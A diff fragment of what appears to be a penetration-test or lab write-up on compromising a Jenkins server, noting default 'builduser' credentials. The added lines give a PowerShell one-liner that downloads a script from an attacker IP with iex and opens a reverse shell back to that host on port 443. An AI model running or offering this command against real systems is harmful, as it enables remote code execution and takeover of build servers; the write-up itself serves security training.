@@ -159,3 +159,7 @@ If we go to the “People” page of Jenkins we can see the users present on the
 publicly available instances.
 In this case `builduser:builduser ` 
 Use the modified version of invoke-powershelltcp.ps1 and download with jenkins to run it as the user running jenkils
+```powershell
+powershell.exe -c iex ((New-Object 
+Net.WebClient).DownloadString('http://172.16.99.115/InvokePowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.99.115 -Port 443
+```
